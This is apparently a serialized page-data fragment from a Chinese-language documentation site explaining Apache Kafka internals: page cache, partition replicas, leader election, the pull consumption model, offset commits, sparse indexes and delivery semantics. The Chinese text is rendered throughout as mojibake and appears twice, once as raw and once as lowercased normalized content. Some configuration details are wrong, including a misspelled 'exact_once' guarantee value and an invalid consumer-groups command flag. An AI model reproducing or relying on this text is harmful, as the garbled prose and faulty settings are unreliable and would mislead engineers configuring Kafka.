è¿ç¹ï¼Kafka æä¸ªåæ°å¯ä»¥è®© consumer é»å¡ç¥éæ°æ¶æ¯å°è¾¾ (å½ç¶ä¹å¯ä»¥é»å¡ç¥éæ¶æ¯çæ°éè¾¾å°æä¸ªç¹å®çéè¿æ ·å°±å¯ä»¥æ¹éåéæ¶æ¯ã\n\n\n# offset æºå¶\n\nConsumer å¨ä» kafka è¯»åæ¶æ¯åï¼å¯ä»¥éæ© commitï¼è¯¥æä½ä¼å¨ kafka ä¸­ä¿å­è¯¥ Consumer å¨è¯¥ partition ä¸­è¯»åçæ¶æ¯ç offsetãè¯¥ Consumer ä¸ä¸æ¬¡åè¯»è¯¥ partition æ¶ä¼ä»ä¸ä¸æ¡å¼å§è¯»åãéè¿è¿ä¸ç¹æ§å¯ä»¥ä¿è¯åä¸æ¶è´¹èä» kafka ä¸­ä¸ä¼éå¤æ¶è´¹æ°æ®ã\n\nkafka åå¯å¨ä»¥åä¼å¨éç½®æä»¶ä¸­ log.dirs è®¾ç½®çè·¯å¾ä¸çæ 50 ä¸ª offset æä»¶ï¼å¦ææ¯éç¾¤å¯å¨ä¼ï¼ä¼ååè¿ 50 ä¸ª offst æä»¶ã\n\nKafka å¯¹äº offset çå¤çæä¸¤ç§æäº¤æ¹å¼ï¼(1) èªå¨æäº¤ (é»è®¤çæäº¤æ¹å¼) (2) æå¨æäº¤ (å¯ä»¥çµæ´»å°æ§å¶ offset)\n\n * èªå¨æäº¤åç§»é:\n   Kafka ä¸­åç§»éçèªå¨æäº¤æ¯ç±åæ° enable_auto_commit å auto_commit_interval_ms æ§å¶çï¼å½ enable_auto_commit=true æ¶ï¼Kafka å¨æ¶è´¹çè¿ç¨ä¸­ä¼ä»¥é¢çä¸º auto_commit_interval_ms å Kafka èªå¸¦ç topic (__consumer_offsets) è¿è¡åç§»éæäº¤ï¼å·ä½æäº¤å°åªä¸ª Partation æ¯ä»¥ç®æ³ï¼Math.abs(groupId.hasCode())%50 æ¥è®¡ç®çãgroup_id çè·åæ¹å¼å¯ä»¥éè¿å¦ä¸å½ä»¤æ¥ç\n\n./kafka-consumer-groups.sh --bootstrap-server ip:port --list --topic_name\n\n\n1\n\n\næåè°ç¨ consumer.close () æ¶åä¹ä¼è§¦åèªå¨æäº¤ï¼å ä¸ºå®é»è®¤ autocommit=True\n\n * æå¨æäº¤åç§»é\n   å¯¹äºæå¨æäº¤ offset ä¸»è¦æ 3 ç§æ¹å¼ï¼1. åæ­¥æäº¤ 2. å¼æ­¥æäº¤ 3. å¼æ­¥ + åæ­¥ ç»åçæ¹å¼æäº¤\n\n\n# kafka ç´¢å¼æºå¶\n\nkafka è§£å³æ¥è¯¢æççææ®µä¹ä¸æ¯å°æ°æ®æä»¶åæ®µï¼å¯ä»¥éç½®æ¯ä¸ªæ°æ®æä»¶çæå¤§å¼ï¼æ¯ä¸ä¸ª log æä»¶çå¤§å°é»è®¤æ¯ 1GBãæ¯æ®µæ¾å¨ä¸ä¸ªåç¬çæ°æ®æä»¶éé¢ï¼æ°æ®æä»¶ä»¥è¯¥å­æ®µä¸­æå°ç offset å½åï¼å¶ä»ä½ç½®ç¨ 0 å¡«åãæåå§çæä»¶æ¯ 00000000000000000000.log å½åçï¼ä½ä¸ä¸ä¸ª log æä»¶çææ¶çç¬¬ä¸æ¡æ¶æ¯ç offset æ¯ 18987ï¼åè¯¥ log æä»¶çå½åæ¯ 00000000000000018987.logï¼å¹¶ä¸æ¯çæä¸ä¸ª log æä»¶å°±ä¼å¯¹åºäº§çä¸ä¸ª index æä»¶ï¼æ¯å log æä»¶çå½åç¸åçãè¿æ ·å¨è¿è¡æ¶æ¯æ£ç´¢çæ¶åå¯ä»¥å¿«éå©ç¨äºåçæ¹æ³è¿è¡æ¥æ¾ï¼å®ä½å°æä¸ä¸ªåæ®µæä»¶ä¸­ã\n\n\n\nç¨çç´¢å¼ + äºåæ¥æ¾ï¼å¯ä»¥å å¿«æ¥æ¾éåº¦\nindex æä»¶ä¸­å¹¶æ²¡æä¸ºæ°æ®æä»¶ä¸­çæ¯æ¡ message å»ºç«ç´¢å¼ï¼èæ¯éç¨äºç¨çå­å¨çæ¹å¼ï¼æ¯éä¸å®å­èçæ°æ®å»ºç«ä¸æ¡ç´¢å¼ãè¿æ ·é¿åäºç´¢å¼æä»¶å ç¨è¿å¤çç©ºé´ï¼ä»èå¯ä»¥å°ç´¢å¼æä»¶ä¿çå¨åå­ä¸­ãä»èéè¦åä¸æ¬¡é¡ºåºæ«æï¼ä½æ¯è¿åºæé¡ºåºæ«æçèå´å°±å¾å°äºã\n\nç´¢å¼æä»¶è¢«æ å°å°åå­ä¸­ï¼æä»¥æ¥æ¾çéåº¦è¿æ¯å¾å¿«çã\n\n\n# kafka çæ¶æ¯ç³»ç»è¯­ä¹\n\nå¨ä¸ä¸ªåå¸å¼åå¸è®¢éç³»ç»ä¸­ï¼ç»æç³»ç»çè®¡ç®æºæ»ä¼ç±äºåèªçæéèä¸è½å·¥ä½ãå¨ kafka ä¸­ï¼ä¸ä¸ªåç¬ç brokerï¼å¯è½ä¼å¨çäº§èåéæ¶æ¯å°ä¸ä¸ª topic çæ¶åå®æºï¼æèåºç°ç½ç»æéï¼ä»èå¯¼è´çäº§èåéæ¶æ¯å¤±è´¥ãæ ¹æ®çäº§èå¦ä½å¤çè¿æ ·çå¤±è´¥ï¼äº§çäºä¸åçè¯­ä¹ã\n\n\n# è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼all æ -1\n\n# çäº§\n\nå¦æçäº§èæ¶å°äº Kafka broker çç¡®è®¤ï¼acknowledgementï¼ackï¼ï¼å¹¶ä¸çäº§èç acks éç½®é¡¹è®¾ç½®ä¸º allï¼æ - 1ï¼ï¼è¿å°±æå³çæ¶æ¯å·²ç»è¢«ç²¾ç¡®ä¸æ¬¡åå¥ Kafka topic äºãç¶èï¼å¦æçäº§èæ¥æ¶ ack è¶æ¶æèæ¶å°äºéè¯¯ï¼å®å°±ä¼è®¤ä¸ºæ¶æ¯æ²¡æåå¥ Kafka topic èå°è¯éæ°åéæ¶æ¯ãå¦æ broker æ°å¥½å¨æ¶æ¯å·²ç»æååå¥ Kafka topic åï¼åé ack åï¼åºäºæéï¼çäº§èçéè¯æºå¶å°±ä¼å¯¼è´è¿æ¡æ¶æ¯è¢«åå¥ Kafka ä¸¤æ¬¡ï¼ä»èå¯¼è´åæ ·çæ¶æ¯ä¼è¢«æ¶è´¹èæ¶è´¹ä¸æ­¢ä¸æ¬¡ãkafka é»è®¤æ¯è¯¥è¯­ä¹\n\n# æ¶è´¹\n\nå³é­èªå¨æäº¤ï¼è¯¥ä¸ºæå¨æäº¤ï¼ä½æ¯å¨ç¨åºå¤ççè¿ç¨ä¸­ï¼å·²ç»æ¥æ°æ®å­å¨æ°æ®åºä¸­ï¼ä½å¨æäº¤ offset çæ¶åæ¥éï¼ä¸æ¬¡ä¼ç»§ç»­æ¶è´¹è¿æ¡æ°æ®ï¼å¯¼è´æ°æ®éå¤ã\n\n\n# è³å¤ä¸æ¬¡è¯­ä¹ï¼at most once semanticsï¼0\n\n# çäº§\n\nå¦æçäº§èå¨ ack è¶æ¶æèè¿åéè¯¯çæ¶åä¸éè¯åéæ¶æ¯ï¼é£ä¹æ¶æ¯æå¯è½æç»å¹¶æ²¡æåå¥ Kafka topic ä¸­ï¼å æ­¤ä¹å°±ä¸ä¼è¢«æ¶è´¹èæ¶è´¹å°ãä½æ¯ä¸ºäºé¿åéå¤å¤ççå¯è½æ§ï¼æä»¬æ¥åæäºæ¶æ¯å¯è½è¢«éæ¼å¤çã\n\n# æ¶è´¹\n\nèªå¨æäº¤æºæºå¶ä¼å¼åè¿ä¸ªé®é¢ï¼å½æ¶è´¹èæ¿å°æ°æ®åï¼å°±ä¼ç«é©¬æäº¤ offset åç§»éï¼ä½æ¯æ°æ®å¹¶æ²¡æå¤çï¼å¦æåçå¤çå¤±è´¥ï¼åä¸æ¬¡æ¥æ¶çåæ¯ä¸ä¸ä¸ªæ°æ®ã\n\n\n# ç²¾ç¡®ä¸æ¬¡è¯­ä¹ï¼Exactly once semanticsï¼\n\n# çäº§\n\nå¨åºäº è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼ä¸æ¹è¿ï¼çäº§èçææ¶æ¯çæ¶åï¼åéä¸ä¸ªå¨å±éå¢ç IDãbroker æ¥æ¶æ¶æ¯çæ¶åï¼å¤æ­å½åæ¶æ¯ç ID æ¯å¦åå·²å­å¨çææ°çæ¶æ¯ ID ç¸å·® > 1ï¼å¦æ <= 1ï¼åè¯´ææ­¤æ¶è´¹å·²å¤çè¿ãå¦æ> 1ï¼è¯æä¸­é´è¿ææ°æ®æªå°è¾¾ã\n\n#ä»£ç ä¸­è¦è®¾ç½®\nacks=all\n# å¿é¡»è®¾ç½®enable.idempotence=true æææç²¾ç¡®ä¸æ¬¡\nenable.idempotence=true\n\n\n1\n2\n3\n4\n\n\n# æ¶è´¹\n\nç²¾ç¡®ä¸æ¬¡å¿é¡»éç½® çäº§èçç²¾ç¡®ä¸æ¬¡éç½®ï¼å¹¶å å¦å¦ä¸\n\nprocessing.guarantee=exact_once\n\n\n1\n\n\nè¿æ ·å¨æ¶è´¹èç«¯ï¼éè¿æ¶æ¯ç ID å®ç°ç²¾ç¡®æ¶è´¹ã",normalizedContent:"# æ¦å¿µ\n\n 1. kafka å¹¶æ²¡æå®å¨éµç§ jms èï¼å®å¦è¾è¹å¾ï¼æ¢ç´¢åºäºä¸æ¡ç¬æçéè·¯\n 2. kafka æ¯ææ¶æ¯åå°é¡µç¼å­ä¸­ï¼ç¶åç±æä½ç³»ç»èªè¡å³å®ä»ä¹æ¶åæé¡µç¼å­ä¸­çæ°æ®ååç£çä¸ï¼è¿æ ·çè®¾è®¡æ 3 ä¸ªä¸»è¦ä¼å¿ï¼\n\n * æä½ç³»ç»é¡µç¼å­æ¯å¨åå­ä¸­åéçï¼æä»¥æ¶æ¯åå¥çéåº¦éå¸¸å¿«ã\n * kafka ä¸å¿ç´æ¥ä¸åºå±çæä»¶ç³»ç»æäº¤éãææç¦çç 1/0 æä½é½äº¤ç±æä½ç³»ç»æ¥å¤ç\n * kafka åå¥æä½éç¨è¿½å åå¥ï¼ append ï¼çæ¹å¼ï¼é¿åäºç£çéæºåæä½ï¼ä¸ä¸åè®¸ä¿®æ¹å·±åå¥çæ¶æ¯ï¼å æ­¤å®å±äºå¸åçç£çé¡ºåºè®¿é®åæä½ãæ®éçç£çé¡ºåºåå¥ è· åå­éæºåå¥æè¿ä¹èæ ä¸åã\n\n 3. kafka å°±æ¯ä¾é ä¸å 4 ç¹è¾¾å°äºé«ååéãä½å»¶æ¶çè®¾è®¡ç®æ çã\n\n * å¤§éä½¿ç¨æä½ç³»ç»é¡µç¼å­ï¼åå­æä½éåº¦å¿«ä¸å½ä¸­çé«ã\n * kafka ä¸ç´æ¥åä¸ç©ç 1/0 æä½ï¼èæ¯äº¤ç±ææé¿æ­¤äºçæä½ç³»ç»æ¥å®æã\n * éç¨è¿½å åå¥æ¹å¼ï¼æå¼äºç¼æ¢çç£çéæºè¯»ï¼åæä½ã\n * ä½¿ç¨ä»¥ sendfile ä¸ºä»£è¡¨çé¶æ·è´ææ¯å å¼ºç½ç»é´çæ°æ®ä¼ è¾æçãä¸¥æ ¼æ¥è¯´æ¯éè¿ java ç filechannel.transferto æ¹æ³å®ç°çã\n\n 4. kafka ä¸­ç topic éå¸¸é½ä¼è¢«å¤ä¸ªæ¶è´¹èè®¢éï¼å æ­¤åºäºæ§è½çèéï¼ kafka å¹¶ä¸æ¯ topicmessage çä¸¤çº§ç»æï¼èæ¯éç¨äº topic-partition-message çä¸çº§ç»ææ¥åæ£è´è½½ã\n 5. topic partition ä¸çæ¯æ¡æ¶æ¯é½è¢«åéä¸ä¸ªä½ç§»å¼ãå®éä¸ kafka æ¶è´¹èç«¯ä¹æä½ç§»ï¼ offset ï¼çæ¦å¿µï¼ä½æ³¨æè¿ä¸¤ä¸ª offset å±äºä¸åçæ¦å¿µãæ¯æ¡æ¶æ¯å¨æä¸ª partition ä½ç§»æ¯åºå®çï¼ä½æ¶è´¹è¯¥ partition çæ¶è´¹èçä½ç§»ä¼éçæ¶è´¹è¿åº¦ (åæè¦æäº¤ offset) ä¸æ­åç§»ã\n 6. å¯¹äºæ¯æ¡å¾åè¿­çæ¶æ¯ï¼å¦æè¯¥æ¶æ¯æå®äº key ï¼é£ä¹è¯¥ partitioner ä¼æ ¹æ® key çåå¸å¼æ¥éæ©ç®æ ååºï¼è¥è¿æ¡æ¶æ¯æ²¡ææå® key ï¼å partitioner ä½¿ç¨è½®è¯¢çæ¹å¼ç¡®è®¤ç®æ ååºä¸ä¸è¿æ ·å¯ä»¥æå¤§éåº¦å°ç¡®ä¿æ¶æ¯å¨ææååºä¸çååæ§\n 7. æ¶è´¹èç offset æ²¡ææäº¤çè¯ï¼ä¸æ¬¡å¯å¨ä¼ä»æ²¡æäº¤çå°æ¹å¼å§è¯»\n 8. kafka çå¹¿æ­æ¨¡å¼ï¼ä¸ä¸ª topic å¯ä»¥è¢«å¤ä¸ªç»çä¸ä¸ªæ¶è´¹èè¿è¡æ¶è´¹ï¼è¿æ ·å°±å®ç°äºå¹¿æ­æ¨¡å¼ãä¹å°±æ¯ç»ä¸ç»ä¹é´å±äº«æ°æ®ï¼ä½ç»åçæ¶è´¹èç«äºæ¶è´¹ã\n 9. kafka æ¶è´¹è¿çæ°æ®ä¾æ§ä¼ä¿çå¨æä»¶ï¼å¯ä»¥éè¿ä¸¤ç§æ¹å¼å é¤æ§æ°æ®ãä¸¤ç§æ¹å¼é½å¯ä»¥éè¿ä¿®æ¹ vim kafka_home/config/server.properties çéç½®æä»¶æ¥è®¾ç½®ã\n\n * å¯ä»¥åºäºæ¶é´éç½®ï¼è®© kafka å é¤ä¸å¨åçæ°æ®ã\n\n# åä½å°æ¶\nlog.retention.hours=168\n\n\n1\n2\n\n * ä¹å¯ä»¥å¨ partition æä»¶è¶è¿ 1gb æ¶å é¤æ§æ°æ®\n\n# åä½å­è\nlog.segment.bytes=1073741824\n\n\n1\n2\n\n\n\n# kafka å¯æ¬ååº\n\n\n\nkafka çååºï¼å¨éç¾¤æ¨¡å¼ä¸ï¼ä¼åååå¸å°æ¯ä¸ªéç¾¤èç¹ã\n\nkafka çå¯æ¬æçæ¯ååºçå¯æ¬ãå¯æ¬æ°éä¸è½è¶è¿ éç¾¤èç¹ çæ°é\n\nkafka éç¾¤æ¯æ²¡æ leader ä¸è¯´çï¼ä½å¯¹äº ååºå¯æ¬ æ¯æ leader çãæ¢ç¶æ leader é£ä¹è¯å®æéä¸¾æºå¶ï¼kafka ä¼å¨éç¾¤ä¸­çéæºä¸ä¸ª broker (èç¹) å¼å¯ä¸ä¸ª controller è¿ç¨ï¼ç¨æ¥è¿è¡ leader çéä¸¾ã\n\n\n# kafka çäº§\n\n\n\n 1. producer åä» zookeeper ç */brokers/.../state èç¹æ¾å°è¯¥ partition ç leader\n 2. producer å°æ¶æ¯åéç» leader\n 3. leader å°æ¶æ¯åå°æ¬å° log\n 4. follower ä» leader æ¹éæåæ¶æ¯ï¼åå¥æ¬å° logï¼æåå leader åé ack\n 5. leader æ¶å°ææ replica ç ack åï¼å¢å  hw (high watemarkï¼æå commit ç offset) å¹¶å producer åé ackã\n    æé´æ isr æºå¶ï¼isr æ¯æï¼æ¯å¦æä¸ä¸ªåå¸â â¡â¢ï¼å¶ä¸­â¡æ¯ leaderï¼â â¢æ¯ followerãåè®¾å¨æ°æ®åæ­¥è¿ç¨ä¸­ï¼â è·ä¸ leaderï¼ä½æ¯â¢åºç°æéæ²¡æåæ­¥ï¼åâ â¡æ¯ä¸ä¸ª isrï¼èâ¢ä¸æ¯ isr æåãåæå¨ leader éä¸¾æ¶ï¼ä¼ç¨å° isr æºå¶ï¼ä¼åä» isr ä¸­éæ© leaderã\n\n\n# kafka leader éä¸¾\n\nè¿éæè°ç ha æå¾å°±æ¯å¯¹ partition ç haï¼åªæ partition æ leader å follower æºå¶ï¼æä»¥ leader æäºä¹åè¦éæ°éä¸¾ leaderãå¨éä¸¾æ° leader æ¶ï¼ä¸ä¸ªåºæ¬ååæ¯ï¼æ°ç leader å¿é¡»æ¥ææ§ç leader commit è¿çæææ¶æ¯ã\n\nç±åå¥æµç¨å¯ç¥ isr éé¢çææ replication é½è·ä¸äº leaderï¼åªæ isr éé¢çæåæè½éä¸º leaderãå¯¹äº f+1 ä¸ª replicationï¼ä¸ä¸ª partition å¯ä»¥å®¹å¿ f ä¸ª replication å¤±æçæåµä¸ä¿è¯æ¶æ¯ä¸ä¸¢å¤±ãæ¯å¦ä¸ä¸ªååº 5 ä¸ªå¯æ¬ï¼æäº 4 ä¸ªï¼è¿æä¸ä¸ªï¼ä¾ç¶å¯ä»¥å·¥ä½ã\n\nå½ææ replication é½ä¸å·¥ä½æ¶ï¼æä¸¤ç§å¯è¡çæ¹æ¡ï¼kafka0.8* ä»¥åé»è®¤ä½¿ç¨ç¬¬äºç§\n\n 1. ç­å¾ isr ä¸­çä»»ä¸ä¸ª replication æ´»è¿æ¥ï¼å¹¶éå®åä¸º leaderãå¯ä¿éæ°æ®ä¸ä¸¢å¤±ï¼ä½æ¶é´å¯è½ç¸å¯¹è¾é¿ã\n 2. éæ©ç¬¬ä¸ä¸ªæ´»è¿æ¥ç replicationï¼ä¸ä¸å®æ¯ isr æåï¼ä½ä¸º leaderãæ æ³ä¿éæ°æ®ä¸ä¸¢å¤±ï¼ä½ç¸å¯¹ä¸å¯ç¨æ¶é´è¾ç­ã\n\n\n# kafka æ¶è´¹æ¨¡å¼\n\né¦åæç¡®ä¸ç¹ï¼kafka ä½¿ç¨çæ¯ pullï¼æåï¼ æ¨¡å¼ã\n\nkafka æåèèçé®é¢æ¯ï¼customer åºè¯¥ä» brokes æåæ¶æ¯è¿æ¯ brokers å°æ¶æ¯æ¨éå° consumerï¼ä¹å°±æ¯ pull è¿ pushãå¨è¿æ¹é¢ï¼kafka éµå¾ªäºä¸ç§å¤§é¨åæ¶æ¯ç³»ç»å±åçä¼ ç»çè®¾è®¡ï¼producer å°æ¶æ¯æ¨éå° brokerï¼consumer ä» broker æåæ¶æ¯ã\n\nä¸äºæ¶æ¯ç³»ç»æ¯å¦ scribe å apache flume éç¨äº push æ¨¡å¼ï¼å°æ¶æ¯æ¨éå°ä¸æ¸¸ç consumerãè¿æ ·åæå¥½å¤ä¹æåå¤ï¼ç± broker å³å®æ¶æ¯æ¨éçéçï¼å¯¹äºä¸åæ¶è´¹éçç consumer å°±ä¸å¤ªå¥½å¤çäºãæ¶æ¯ç³»ç»é½è´åäºè®© consumer ä»¥æå¤§çéçæå¿«éçæ¶è´¹æ¶æ¯ï¼ä½ä¸å¹¸çæ¯ï¼push æ¨¡å¼ä¸ï¼å½ broker æ¨éçéçè¿å¤§äº consumer æ¶è´¹çéçæ¶ï¼consumer ææå°±è¦å´©æºäºãæç» kafka è¿æ¯éåäºä¼ ç»ç pull æ¨¡å¼ãpull æ¨¡å¼çå¦å¤ä¸ä¸ªå¥½å¤æ¯ consumer å¯ä»¥èªä¸»å³å®æ¯å¦æ¹éçä» broker æåæ°æ®ãpush æ¨¡å¼å¿é¡»å¨ä¸ç¥éä¸æ¸¸ consumer æ¶è´¹è½ååæ¶è´¹ç­ç¥çæåµä¸å³å®æ¯ç«å³æ¨éæ¯æ¡æ¶æ¯è¿æ¯ç¼å­ä¹åæ¹éæ¨éãå¦æä¸ºäºé¿å consumer å´©æºèéç¨è¾ä½çæ¨ééçï¼å°å¯è½å¯¼è´ä¸æ¬¡åªæ¨éè¾å°çæ¶æ¯èé ææµªè´¹ãpull æ¨¡å¼ä¸ï¼consumer å°±å¯ä»¥æ ¹æ®èªå·±çæ¶è´¹è½åå»å³å®è¿äºç­ç¥ãpull æä¸ªç¼ºç¹æ¯ï¼å¦æ broker æ²¡æå¯ä¾æ¶è´¹çæ¶æ¯ï¼å°å¯¼è´ consumer ä¸æ­å¨å¾ªç¯ä¸­è½®è¯¢ï¼ç´å°æ°æ¶æ¯å°è¾¾ãä¸ºäºé¿åè¿ç¹ï¼kafka æä¸ªåæ°å¯ä»¥è®© consumer é»å¡ç¥éæ°æ¶æ¯å°è¾¾ (å½ç¶ä¹å¯ä»¥é»å¡ç¥éæ¶æ¯çæ°éè¾¾å°æä¸ªç¹å®çéè¿æ ·å°±å¯ä»¥æ¹éåéæ¶æ¯ã\n\n\n# offset æºå¶\n\nconsumer å¨ä» kafka è¯»åæ¶æ¯åï¼å¯ä»¥éæ© commitï¼è¯¥æä½ä¼å¨ kafka ä¸­ä¿å­è¯¥ consumer å¨è¯¥ partition ä¸­è¯»åçæ¶æ¯ç offsetãè¯¥ consumer ä¸ä¸æ¬¡åè¯»è¯¥ partition æ¶ä¼ä»ä¸ä¸æ¡å¼å§è¯»åãéè¿è¿ä¸ç¹æ§å¯ä»¥ä¿è¯åä¸æ¶è´¹èä» kafka ä¸­ä¸ä¼éå¤æ¶è´¹æ°æ®ã\n\nkafka åå¯å¨ä»¥åä¼å¨éç½®æä»¶ä¸­ log.dirs è®¾ç½®çè·¯å¾ä¸çæ 50 ä¸ª offset æä»¶ï¼å¦ææ¯éç¾¤å¯å¨ä¼ï¼ä¼ååè¿ 50 ä¸ª offst æä»¶ã\n\nkafka å¯¹äº offset çå¤çæä¸¤ç§æäº¤æ¹å¼ï¼(1) èªå¨æäº¤ (é»è®¤çæäº¤æ¹å¼) (2) æå¨æäº¤ (å¯ä»¥çµæ´»å°æ§å¶ offset)\n\n * èªå¨æäº¤åç§»é:\n   kafka ä¸­åç§»éçèªå¨æäº¤æ¯ç±åæ° enable_auto_commit å auto_commit_interval_ms æ§å¶çï¼å½ enable_auto_commit=true æ¶ï¼kafka å¨æ¶è´¹çè¿ç¨ä¸­ä¼ä»¥é¢çä¸º auto_commit_interval_ms å kafka èªå¸¦ç topic (__consumer_offsets) è¿è¡åç§»éæäº¤ï¼å·ä½æäº¤å°åªä¸ª partation æ¯ä»¥ç®æ³ï¼math.abs(groupid.hascode())%50 æ¥è®¡ç®çãgroup_id çè·åæ¹å¼å¯ä»¥éè¿å¦ä¸å½ä»¤æ¥ç\n\n./kafka-consumer-groups.sh --bootstrap-server ip:port --list --topic_name\n\n\n1\n\n\næåè°ç¨ consumer.close () æ¶åä¹ä¼è§¦åèªå¨æäº¤ï¼å ä¸ºå®é»è®¤ autocommit=true\n\n * æå¨æäº¤åç§»é\n   å¯¹äºæå¨æäº¤ offset ä¸»è¦æ 3 ç§æ¹å¼ï¼1. åæ­¥æäº¤ 2. å¼æ­¥æäº¤ 3. å¼æ­¥ + åæ­¥ ç»åçæ¹å¼æäº¤\n\n\n# kafka ç´¢å¼æºå¶\n\nkafka è§£å³æ¥è¯¢æççææ®µä¹ä¸æ¯å°æ°æ®æä»¶åæ®µï¼å¯ä»¥éç½®æ¯ä¸ªæ°æ®æä»¶çæå¤§å¼ï¼æ¯ä¸ä¸ª log æä»¶çå¤§å°é»è®¤æ¯ 1gbãæ¯æ®µæ¾å¨ä¸ä¸ªåç¬çæ°æ®æä»¶éé¢ï¼æ°æ®æä»¶ä»¥è¯¥å­æ®µä¸­æå°ç offset å½åï¼å¶ä»ä½ç½®ç¨ 0 å¡«åãæåå§çæä»¶æ¯ 00000000000000000000.log å½åçï¼ä½ä¸ä¸ä¸ª log æä»¶çææ¶çç¬¬ä¸æ¡æ¶æ¯ç offset æ¯ 18987ï¼åè¯¥ log æä»¶çå½åæ¯ 00000000000000018987.logï¼å¹¶ä¸æ¯çæä¸ä¸ª log æä»¶å°±ä¼å¯¹åºäº§çä¸ä¸ª index æä»¶ï¼æ¯å log æä»¶çå½åç¸åçãè¿æ ·å¨è¿è¡æ¶æ¯æ£ç´¢çæ¶åå¯ä»¥å¿«éå©ç¨äºåçæ¹æ³è¿è¡æ¥æ¾ï¼å®ä½å°æä¸ä¸ªåæ®µæä»¶ä¸­ã\n\n\n\nç¨çç´¢å¼ + äºåæ¥æ¾ï¼å¯ä»¥å å¿«æ¥æ¾éåº¦\nindex æä»¶ä¸­å¹¶æ²¡æä¸ºæ°æ®æä»¶ä¸­çæ¯æ¡ message å»ºç«ç´¢å¼ï¼èæ¯éç¨äºç¨çå­å¨çæ¹å¼ï¼æ¯éä¸å®å­èçæ°æ®å»ºç«ä¸æ¡ç´¢å¼ãè¿æ ·é¿åäºç´¢å¼æä»¶å ç¨è¿å¤çç©ºé´ï¼ä»èå¯ä»¥å°ç´¢å¼æä»¶ä¿çå¨åå­ä¸­ãä»èéè¦åä¸æ¬¡é¡ºåºæ«æï¼ä½æ¯è¿åºæé¡ºåºæ«æçèå´å°±å¾å°äºã\n\nç´¢å¼æä»¶è¢«æ å°å°åå­ä¸­ï¼æä»¥æ¥æ¾çéåº¦è¿æ¯å¾å¿«çã\n\n\n# kafka çæ¶æ¯ç³»ç»è¯­ä¹\n\nå¨ä¸ä¸ªåå¸å¼åå¸è®¢éç³»ç»ä¸­ï¼ç»æç³»ç»çè®¡ç®æºæ»ä¼ç±äºåèªçæéèä¸è½å·¥ä½ãå¨ kafka ä¸­ï¼ä¸ä¸ªåç¬ç brokerï¼å¯è½ä¼å¨çäº§èåéæ¶æ¯å°ä¸ä¸ª topic çæ¶åå®æºï¼æèåºç°ç½ç»æéï¼ä»èå¯¼è´çäº§èåéæ¶æ¯å¤±è´¥ãæ ¹æ®çäº§èå¦ä½å¤çè¿æ ·çå¤±è´¥ï¼äº§çäºä¸åçè¯­ä¹ã\n\n\n# è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼all æ -1\n\n# çäº§\n\nå¦æçäº§èæ¶å°äº kafka broker çç¡®è®¤ï¼acknowledgementï¼ackï¼ï¼å¹¶ä¸çäº§èç acks éç½®é¡¹è®¾ç½®ä¸º allï¼æ - 1ï¼ï¼è¿å°±æå³çæ¶æ¯å·²ç»è¢«ç²¾ç¡®ä¸æ¬¡åå¥ kafka topic äºãç¶èï¼å¦æçäº§èæ¥æ¶ ack è¶æ¶æèæ¶å°äºéè¯¯ï¼å®å°±ä¼è®¤ä¸ºæ¶æ¯æ²¡æåå¥ kafka topic èå°è¯éæ°åéæ¶æ¯ãå¦æ broker æ°å¥½å¨æ¶æ¯å·²ç»æååå¥ kafka topic åï¼åé ack åï¼åºäºæéï¼çäº§èçéè¯æºå¶å°±ä¼å¯¼è´è¿æ¡æ¶æ¯è¢«åå¥ kafka ä¸¤æ¬¡ï¼ä»èå¯¼è´åæ ·çæ¶æ¯ä¼è¢«æ¶è´¹èæ¶è´¹ä¸æ­¢ä¸æ¬¡ãkafka é»è®¤æ¯è¯¥è¯­ä¹\n\n# æ¶è´¹\n\nå³é­èªå¨æäº¤ï¼è¯¥ä¸ºæå¨æäº¤ï¼ä½æ¯å¨ç¨åºå¤ççè¿ç¨ä¸­ï¼å·²ç»æ¥æ°æ®å­å¨æ°æ®åºä¸­ï¼ä½å¨æäº¤ offset çæ¶åæ¥éï¼ä¸æ¬¡ä¼ç»§ç»­æ¶è´¹è¿æ¡æ°æ®ï¼å¯¼è´æ°æ®éå¤ã\n\n\n# è³å¤ä¸æ¬¡è¯­ä¹ï¼at most once semanticsï¼0\n\n# çäº§\n\nå¦æçäº§èå¨ ack è¶æ¶æèè¿åéè¯¯çæ¶åä¸éè¯åéæ¶æ¯ï¼é£ä¹æ¶æ¯æå¯è½æç»å¹¶æ²¡æåå¥ kafka topic ä¸­ï¼å æ­¤ä¹å°±ä¸ä¼è¢«æ¶è´¹èæ¶è´¹å°ãä½æ¯ä¸ºäºé¿åéå¤å¤ççå¯è½æ§ï¼æä»¬æ¥åæäºæ¶æ¯å¯è½è¢«éæ¼å¤çã\n\n# æ¶è´¹\n\nèªå¨æäº¤æºæºå¶ä¼å¼åè¿ä¸ªé®é¢ï¼å½æ¶è´¹èæ¿å°æ°æ®åï¼å°±ä¼ç«é©¬æäº¤ offset åç§»éï¼ä½æ¯æ°æ®å¹¶æ²¡æå¤çï¼å¦æåçå¤çå¤±è´¥ï¼åä¸æ¬¡æ¥æ¶çåæ¯ä¸ä¸ä¸ªæ°æ®ã\n\n\n# ç²¾ç¡®ä¸æ¬¡è¯­ä¹ï¼exactly once semanticsï¼\n\n# çäº§\n\nå¨åºäº è³å°ä¸æ¬¡è¯­ä¹ï¼at least once semanticsï¼ä¸æ¹è¿ï¼çäº§èçææ¶æ¯çæ¶åï¼åéä¸ä¸ªå¨å±éå¢ç idãbroker æ¥æ¶æ¶æ¯çæ¶åï¼å¤æ­å½åæ¶æ¯ç id æ¯å¦åå·²å­å¨çææ°çæ¶æ¯ id ç¸å·® > 1ï¼å¦æ <= 1ï¼åè¯´ææ­¤æ¶è´¹å·²å¤çè¿ãå¦æ> 1ï¼è¯æä¸­é´è¿ææ°æ®æªå°è¾¾ã\n\n#ä»£ç ä¸­è¦è®¾ç½®\nacks=all\n# å¿é¡»è®¾ç½®enable.idempotence=true æææç²¾ç¡®ä¸æ¬¡\nenable.idempotence=true\n\n\n1\n2\n3\n4\n\n\n# æ¶è´¹\n\nç²¾ç¡®ä¸æ¬¡å¿é¡»éç½® çäº§èçç²¾ç¡®ä¸æ¬¡éç½®ï¼å¹¶å å¦å¦ä¸\n\nprocessing.guarantee=exact_once\n\n\n1\n\n\nè¿æ ·å¨æ¶è´¹èç«¯ï¼éè¿æ¶æ¯ç id å®ç°ç²¾ç¡®æ¶è´¹ã",charsets:{cjk:!0}},{title:"Kafka-2.7.0 æ­å»ºååæ°è§£æ",frontmatter:{title:"Kafka-2.7.0 